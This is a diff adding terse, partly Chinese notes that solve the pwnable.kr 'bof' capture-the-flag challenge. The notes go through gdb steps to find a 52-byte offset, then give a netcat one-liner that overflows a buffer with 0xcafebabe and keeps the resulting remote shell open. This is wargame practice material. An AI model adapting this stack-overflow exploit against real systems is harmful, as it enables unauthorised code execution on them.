@@ -1,0 +1,10 @@
+1.gdb bof
+2.r
+3.aaaa
+4.disas func
+5.b *0x56555654
+6.aaaa
+7.info reg
+8.x/60bx eax的位址
+9.算出offset是52
+10.(echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbe\xba\xfe\xca";cat) | nc pwnable.kr 9000
